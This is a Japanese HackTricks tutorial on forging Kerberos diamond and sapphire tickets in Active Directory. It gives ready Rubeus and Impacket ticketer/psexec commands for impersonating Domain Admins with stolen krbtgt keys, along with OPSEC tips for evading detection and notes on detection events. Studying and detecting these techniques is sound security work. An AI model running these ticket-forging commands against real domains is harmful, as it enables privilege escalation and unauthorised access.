# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**golden ticketと同様に**、diamond ticketは**任意のユーザーとして任意のサービスにアクセスするために使える**TGTです。golden ticketは完全にオフラインで偽造され、そのドメインのkrbtgt hashで暗号化された後、使用するためにログオンセッションに渡されます。ドメインコントローラーは、正規に発行したTGTを追跡していないため、自身のkrbtgt hashで暗号化されたTGTを問題なく受け入れます。<sup>[[1]](#references)</sup>

golden ticketの使用を検出する一般的な手法は2つあります。

- 対応するAS-REQがないTGS-REQを探す。
- Mimikatzのデフォルトの10年の有効期間など、不自然な値を持つTGTを探す。

**diamond ticket**は、**DCが発行した正規のTGTのフィールドを変更して**作成します。これは、**TGTを要求**し、ドメインのkrbtgt hashで**復号**し、チケットの必要なフィールドを**変更**した後、**再暗号化する**ことで実現します。これにより、golden ticketの前述の2つの欠点を克服できます。理由は次のとおりです。<sup>[[1]](#references)</sup>

- TGS-REQの前にAS-REQが存在する。
- TGTはDCによって発行されているため、ドメインのKerberosポリシーに沿った正しい詳細情報を含む。golden ticketでも正確に偽造することは可能ですが、より複雑で、ミスが起きやすくなります。

### 要件とワークフロー

- **暗号素材**: TGTの復号と再署名に必要なkrbtgt AES256 key（推奨）またはNTLM hash。
- **正規のTGT blob**: `/tgtdeleg`、`asktgt`、`s4u`を使って取得するか、メモリからチケットをエクスポートして取得します。
- **コンテキストデータ**: 対象ユーザーのRID、グループのRID/SID、および（任意で）LDAPから取得したPAC属性。
- **サービスキー**（サービスチケットを再発行する場合のみ）: なりすます対象のサービスSPNのAES key。

1. AS-REQを介して、制御下にある任意のユーザーのTGTを取得します（Rubeusの`/tgtdeleg`は、資格情報なしでクライアントにKerberos GSS-APIのやり取りを実行させるため便利です）。
2. 返されたTGTをkrbtgt keyで復号し、PAC属性（ユーザー、グループ、ログオン情報、SID、デバイスクレームなど）を修正します。
3. 同じkrbtgt keyでチケットを再暗号化・署名し、現在のログオンセッションに注入します（`kerberos::ptt`、`Rubeus.exe ptt`など）。
4. 任意で、有効なTGT blobと対象サービスのkeyを指定してサービスチケットに対しても同じ処理を行い、通信上での検知を避けます。

### Rubeusの最新tradecraft（2024年以降）

Huntressによる最近の取り組みでは、以前はgolden/silver ticketでのみ利用可能だった`/ldap`と`/opsec`の改善を取り込み、Rubeusの`diamond` actionを最新化しました。`/ldap`はLDAPへの問い合わせに加えてSYSVOLをマウントし、アカウント/グループ属性とKerberos/パスワードポリシー（例: `GptTmpl.inf`）を抽出して、実際のPACコンテキストを取得します。一方、`/opsec`は2段階のpreauth交換を行い、AESのみを強制し、現実的なKDCOptionsを使用することで、AS-REQ/AS-REPのフローをWindowsと一致させます。これにより、PACフィールドの欠落やポリシーと一致しない有効期間など、明白な兆候を大幅に減らせます。<sup>[[3]](#references)</sup>

```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
  /ticketuser:svc_sql /ticketuserid:1109 \
  /groups:512,519 \
  /krbkey:<KRBTGT_AES256_KEY> \
  /ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
  /opsec /nowrap
```

- `/ldap`（任意で `/ldapuser` と `/ldappassword` を指定）を使うと、AD と SYSVOL に問い合わせて、対象ユーザーの PAC ポリシーデータを複製します。
- `/opsec` を指定すると、Windows に似た AS-REQ の再試行を強制し、ノイズとなるフラグをゼロにして AES256 のみを使用します。
- `/tgtdeleg` を使うと、被害者のクリアテキストパスワードや NTLM/AES key に触れずに、復号可能な TGT を取得できます。

### Service-ticket recutting

同じ Rubeus の更新では、diamond technique を TGS blob に適用する機能も追加されました。`diamond` に **base64-encoded TGT**（`asktgt`、`/tgtdeleg`、または以前に偽造した TGT から取得）、**service SPN**、**service AES key** を渡せば、KDC に接続せずに現実的なサービスチケットを発行できます。実質的には、よりステルス性の高い silver ticket です。<sup>[[3]](#references)</sup>

```powershell
./Rubeus.exe diamond \
  /ticket:<BASE64_TGT_OR_KRB-CRED> \
  /service:cifs/dc01.lab.local \
  /servicekey:<AES256_SERVICE_KEY> \
  /ticketuser:svc_sql /ticketuserid:1109 \
  /ldap /opsec /nowrap
```

この workflow は、すでに service account key を入手しており（例: `lsadump::lsa /inject` または `secretsdump.py` でダンプ済み）、新たな AS/TGS traffic を発生させずに、AD policy、タイムライン、PAC data に完全に合致する TGS を一度だけ作成したい場合に最適です。<sup>[[3]](#references)</sup>

### Sapphire-style PAC swaps (2025)

sapphire ticket と呼ばれることもある新しい手法では、Diamond の「real TGT」ベースに **S4U2self+U2U** を組み合わせ、特権ユーザーの PAC を盗んで自分の TGT に挿入します。SID を新たに捏造する代わりに、`sname` が権限の低い requester を指すようにして、特権ユーザー向けの U2U S4U2self ticket を要求します。KRB_TGS_REQ には requester の TGT を `additional-tickets` に含め、`ENC-TKT-IN-SKEY` を設定することで、そのユーザーの key を使って service ticket を復号できるようにします。その後、特権 PAC を抽出し、krbtgt key で再署名する前に、正規の TGT に組み込みます。<sup>[[2]](#references)[[5]](#references)</sup>

Impacket の `ticketer.py` では、`-impersonate` + `-request` を使った sapphire support（live KDC exchange）が利用できるようになりました。<sup>[[2]](#references)[[5]](#references)</sup>

```bash
python3 ticketer.py -request -impersonate 'DAuser' \
  -domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
  -aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333'
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```

- `-impersonate` はユーザー名または SID を受け取ります。`-request` では、チケットを復号・パッチするために、現在有効なユーザー認証情報と krbtgt キーマテリアル（AES/NTLM）が必要です。

この亜種を使う際の主な OPSEC 上の手がかり:<sup>[[5]](#references)</sup>

- TGS-REQ には `ENC-TKT-IN-SKEY` と `additional-tickets`（被害者の TGT）が含まれます。通常のトラフィックではまれです。
- `sname` は要求元ユーザーと同じ値になることがよくあります（セルフサービスアクセス）。Event ID 4769 では、呼び出し元とターゲットが同じ SPN/ユーザーとして記録されます。
- 同じクライアントコンピューターからの 4768/4769 の組み合わせが記録されますが、CNAME は異なります（低権限の要求元と、特権を持つ PAC の所有者）。

### OPSEC と検知に関する注意事項

- 従来のハンター向けヒューリスティック（AS なしの TGS、10 年単位の有効期間）は golden ticket にも引き続き有効ですが、diamond ticket は主に **PAC の内容やグループマッピングに不自然さがある場合**に表面化します。自動比較ですぐに偽造だと判定されないよう、logon hours、ユーザープロファイルのパス、デバイス ID など、PAC のすべてのフィールドを設定してください。<sup>[[3]](#references)</sup>
- **グループ/RID を過剰に追加しないでください**。`512`（Domain Admins）と `519`（Enterprise Admins）だけが必要なら、それだけにとどめ、AD 内の別の場所でも対象アカウントが妥当にそれらのグループに所属していることを確認してください。過剰な `ExtraSids` は不自然さが目立ちます。
- Sapphire 形式の入れ替えでは U2U の痕跡が残ります。4769 における `ENC-TKT-IN-SKEY` + `additional-tickets` と、ユーザー（多くの場合は要求元）を指す `sname`、さらに偽造チケットを使った後続の 4624 ログオンがその痕跡です。AS-REQ がない箇所だけを見るのではなく、これらのフィールドを相関分析してください。<sup>[[5]](#references)</sup>
- Microsoft は CVE-2026-20833 を受け、**RC4 サービステicketの発行**を段階的に廃止し始めました。KDC で AES のみの etype を強制すれば、ドメインのセキュリティが強化され、diamond/sapphire ツールとの整合性も取れます（/opsec はすでに AES を強制します）。偽造 PAC に RC4 を混在させると、今後ますます目立つようになります。<sup>[[6]](#references)</sup>
- Splunk の Security Content プロジェクトでは、diamond ticket の attack-range テレメトリと、*Windows Domain Admin Impersonation Indicator* などの検知ルールが配布されています。これらは、通常とは異なる Event ID 4768/4769/4624 のシーケンスと PAC のグループ変更を相関分析します。このデータセットを再生する（または上記のコマンドで独自に生成する）ことで、T1558.001 に対する SOC のカバレッジを検証できるほか、回避に利用できる具体的なアラートロジックも得られます。<sup>[[4]](#references)</sup>

## References

- [1] [Palo Alto Unit 42 – 貴重な宝石：Kerberos攻撃の新世代 (2022)](https://unit42.paloaltonetworks.com/next-gen-kerberos-attacks/)
- [2] [Core Security – Impacket: チケットで遊ぶのが大好き (2023)](https://www.coresecurity.com/core-labs/articles/impacket-we-love-playing-tickets)
- [3] [Huntress – Kerberos Diamond Ticket の再構築 (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [4] [Splunk Security Content – Diamond Ticket の攻撃データと検知ルール (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [5] [Хабр – 宝石の影の側面：Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [6] [Microsoft – CVE-2026-20833 に対する RC4 サービステicketの適用](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)
{{#include ../../banners/hacktricks-training.md}}
